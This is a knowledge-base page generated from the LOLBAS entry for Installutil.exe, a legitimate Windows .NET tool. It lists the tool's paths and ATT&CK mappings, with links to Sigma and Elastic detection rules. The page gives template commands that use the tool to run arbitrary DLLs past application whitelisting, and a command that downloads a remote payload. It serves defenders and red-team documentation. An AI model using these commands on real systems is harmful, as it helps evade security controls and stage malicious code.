---
title: "Installutil.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Installutil.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Installutil.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "Installutil.exe"
functions:
  - "AWL Bypass"
  - "Execute"
  - "Download"
attack_technique_ids:
  - "T1218.004"
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Installutil.exe

The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies

## Metadata

- Category: OSBinaries
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OSBinaries/Installutil.yml

## Paths

- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`

## Commands

### 1. AWL Bypass

Execute the target .NET DLL or EXE.

```cmd
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
```

- Use Case: Use to execute code and bypass application whitelisting
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.004]]

### 2. Execute

Execute the target .NET DLL or EXE.

```cmd
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
```

- Use Case: Use to execute code and bypass application whitelisting
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.004]]

### 3. Download

It will download a remote payload and place it in INetCache.

```cmd
InstallUtil.exe {REMOTEURL}
```

- Use Case: Downloads payload from remote server
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_instalutil_no_log_execution.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_installutil_download.yml
- Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml

## Resources

- {'Link': 'https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/'}
- {'Link': 'https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12'}
- {'Link': 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md'}
- {'Link': 'https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/'}
- {'Link': 'https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/'}
- {'Link': 'https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool'}

## Acknowledgements

- {'Person': 'Casey Smith', 'Handle': '@subtee'}
- {'Person': 'Nir Chako (Pentera)', 'Handle': '@C_h4ck_0'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Installutil.yml)
